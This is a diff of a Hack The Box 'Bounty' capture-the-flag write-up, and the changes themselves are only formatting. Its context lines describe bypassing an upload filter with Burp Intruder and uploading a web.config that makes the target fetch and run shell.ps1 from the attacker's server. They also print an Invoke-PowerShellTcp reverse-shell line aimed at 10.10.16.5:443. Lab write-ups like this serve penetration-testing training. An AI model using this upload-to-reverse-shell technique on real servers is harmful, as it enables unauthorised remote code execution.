@@ -161,7 +161,7 @@ I tried to upload a simple .aspx shell and I got invalid file type message. So n
 Running the Brup Intruder gives me some good valid file types that I can upload.
 ![](Pasted%20image%2020240809135108.png)
 
-Sort it by Content-Length. Content Length for valid file type 1331 and for invalid filetype 1336. So I got couple of options. Let's try .config file. I found an interesting [GitHub repo](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config) to prepare a web.config file with aspx code underneath of the file that will execute the aspx code and get me the reverse shell. But before I dive into it, I need to look at the web.config file. Here's my web.config file.
+Sort it by Content-Length. Content Length for valid file type 1331 and for invalid filetype 1336. So I got couple of options. Let's try .config file. I found an interesting [GitHub repo](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config) to prepare a Web.Config file with ASPX code underneath of the file that will execute the ASPX code and get me the reverse shell. But before I dive into it, I need to look at the web.config file. Here's my web.config file.
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -196,7 +196,7 @@ Look at the line where it says "shell.ps1". The same GitHub Repo contains the In
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 443
 ```
 
-So what is happening here? I will upload the web.config file through the transfer.aspx. The file will be accessible using the URL http://bounty.htb/uploadedFiles/web.config following to that the web.cofig file will try to download the shell1.ps from my server. So I need to start the python web server on my end. As soon as I open web.config, I will notice the GET request on my server. Target will try to download the shell.ps1 from my server and execute. Once the execution completes, I will have my reverse shell.
+So what is happening here? I will upload the web.config file through the transfer.aspx. The file will be accessible using the URL `http://bounty.htb/uploadedFiles/web.config` following to that the web.cofig file will try to download the shell1.ps from my server. So I need to start the python web server on my end. As soon as I open web.config, I will notice the GET request on my server. Target will try to download the shell.ps1 from my server and execute. Once the execution completes, I will have my reverse shell.
 
 ```
 ──(ringbuffer㉿kali)-[~/Downloads/Bounty.htb]
@@ -221,7 +221,6 @@ bounty\merlin
 
 
 At this point, as tried in the previous boxes (devel, granny, Grandpa), the local_exploit_suggester did not show any of the exploits. Let's try out winPEAS.
-
 #### System Info 
 
 The following results were obtained after running winPEAS.bat on the target. The obtained shell was a powershell which has the script execution disabled. The user doesn't have a rights to enabled the script execution. Hence, I switched to cmd.exe and ran the .bat files.
